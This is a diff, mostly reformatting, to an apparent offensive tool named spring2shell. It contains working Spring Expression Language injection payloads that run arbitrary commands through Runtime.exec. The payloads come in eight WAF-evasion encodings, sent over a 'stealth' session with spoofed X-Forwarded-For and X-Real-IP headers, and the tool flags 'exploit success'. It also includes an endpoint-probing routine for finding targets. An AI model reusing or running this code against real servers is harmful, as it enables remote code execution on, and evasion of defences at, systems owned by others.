@@ -14,8 +14,6 @@ import time
 import urllib.parse
 from typing import Any
 
-import requests
-
 from spring2shell.core.session import create_stealth_session
 from spring2shell.evasion.headers import get_random_headers
 from spring2shell.utils.logging import log_event, log_swallowed_exception
@@ -33,35 +31,51 @@ _WAF_TECHNIQUES: list[dict[str, Any]] = [
     },
     {
         "name": "Unicode Escape",
-        "build": lambda cmd: f'{{"qu\\u0065ry": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        "build": lambda cmd: (
+            f'{{"qu\\u0065ry": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        ),
     },
     {
         "name": "Mixed Case Headers",
-        "build": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        "build": lambda cmd: (
+            f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        ),
     },
     {
         "name": "Null Bytes",
-        "build": lambda cmd: f'{{"query\\x00": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        "build": lambda cmd: (
+            f'{{"query\\x00": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        ),
     },
     {
         "name": "Extra Whitespace",
-        "build": lambda cmd: f'{{\n\t"query":\n\t"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"\n}}'
+        "build": lambda cmd: (
+            f'{{\n\t"query":\n\t"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"\n}}'
+        ),
     },
     {
         "name": "JSON Wrapped",
-        "build": lambda cmd: f'{{"data":{{"query":"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}}}'
+        "build": lambda cmd: (
+            f'{{"data":{{"query":"{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}}}'
+        ),
     },
     {
         "name": "Form URL Encoded",
-        "build": lambda cmd: f'query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D'
+        "build": lambda cmd: (
+            f"query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D"
+        ),
     },
     {
         "name": "XML Content-Type",
-        "build": lambda cmd: f'<query>{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}</query>'
+        "build": lambda cmd: (
+            f'<query>{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}</query>'
+        ),
     },
     {
         "name": "Chunked Encoding",
-        "build": lambda cmd: f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        "build": lambda cmd: (
+            f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'
+        ),
     },
 ]
 
@@ -88,8 +102,13 @@ def aggressive_waf_bypass(
         List of result dicts for each technique/method pair that was NOT blocked
         (status code not 401/403).
     """
-    log_event(logging.INFO, "aggressive_waf_bypass start",
-              endpoint=endpoint, techniques=len(_WAF_TECHNIQUES), methods=len(_HTTP_METHODS))
+    log_event(
+        logging.INFO,
+        "aggressive_waf_bypass start",
+        endpoint=endpoint,
+        techniques=len(_WAF_TECHNIQUES),
+        methods=len(_HTTP_METHODS),
+    )
     results: list[dict[str, Any]] = []
     session = create_stealth_session("aggressive")
 
@@ -101,8 +120,8 @@ def aggressive_waf_bypass(
                 payload = technique["build"](command)
                 headers = get_random_headers()
                 rand_ip = (
-                    f"{random.randint(1,255)}.{random.randint(1,255)}"
-                    f".{random.randint(1,255)}.{random.randint(1,255)}"
+                    f"{random.randint(1, 255)}.{random.randint(1, 255)}"
+                    f".{random.randint(1, 255)}.{random.randint(1, 255)}"
                 )
                 headers["X-Forwarded-For"] = rand_ip
                 headers["X-Real-IP"] = rand_ip
@@ -110,14 +129,19 @@ def aggressive_waf_bypass(
                 headers["Referer"] = target_url
 
                 if http_method == "GET":
-                    params = {p.split("=")[0]: p.split("=")[1] for p in payload.split("&") if "=" in p} \
-                        if "form-urlencoded" in technique["name"].lower() \
+                    params = (
+                        {p.split("=")[0]: p.split("=")[1] for p in payload.split("&") if "=" in p}
+                        if "form-urlencoded" in technique["name"].lower()
                         else {"query": payload}
+                    )
                     response = session.get(endpoint, params=params, headers=headers, timeout=8)
                 else:
                     response = session.request(
-                        method=http_method, url=endpoint,
-                        data=payload, headers=headers, timeout=8,
+                        method=http_method,
+                        url=endpoint,
+                        data=payload,
+                        headers=headers,
+                        timeout=8,
                     )
 
                 if response.status_code not in (403, 401):
@@ -133,12 +157,19 @@ def aggressive_waf_bypass(
                         "response_preview": response.text[:500],
                     }
                     results.append(entry)
-                    log_event(logging.INFO, "WAF bypass not blocked",
-                              technique=technique["name"], method=http_method,
-                              status=response.status_code)
+                    log_event(
+                        logging.INFO,
+                        "WAF bypass not blocked",
+                        technique=technique["name"],
+                        method=http_method,
+                        status=response.status_code,
+                    )
                     if response.status_code == 200 and found_indicators:
-                        log_event(logging.WARNING, "POTENTIAL EXPLOIT SUCCESS",
-                                  technique=technique["name"])
+                        log_event(
+                            logging.WARNING,
+                            "POTENTIAL EXPLOIT SUCCESS",
+                            technique=technique["name"],
+                        )
                         return results
 
                 time.sleep(random.uniform(0.2, 0.8))
@@ -184,8 +215,14 @@ def find_working_endpoint(target_url: str, limit: int = 30) -> list[dict[str, An
                 if "application/json" in ct or any(
                     ind in get_resp.text.lower() for ind in _API_INDICATORS
                 ):
-                    working.append({"url": url, "method": "GET",
-                                    "status": get_resp.status_code, "type": "GET endpoint"})
+                    working.append(
+                        {
+                            "url": url,
+                            "method": "GET",
+                            "status": get_resp.status_code,
+                            "type": "GET endpoint",
+                        }
+                    )
         except Exception:
             pass
         try:
@@ -195,12 +232,19 @@ def find_working_endpoint(target_url: str, limit: int = 30) -> list[dict[str, An
                 if "application/json" in ct or any(
                     ind in post_resp.text.lower() for ind in _API_INDICATORS
                 ):
-                    working.append({"url": url, "method": "POST",
-                                    "status": post_resp.status_code, "type": "API endpoint"})
+                    working.append(
+                        {
+                            "url": url,
+                            "method": "POST",
+                            "status": post_resp.status_code,
+                            "type": "API endpoint",
+                        }
+                    )
         except Exception:
             pass
         time.sleep(0.3)
 
-    log_event(logging.INFO, "find_working_endpoint complete",
-              target=target_url, working=len(working))
+    log_event(
+        logging.INFO, "find_working_endpoint complete", target=target_url, working=len(working)
+    )
     return working
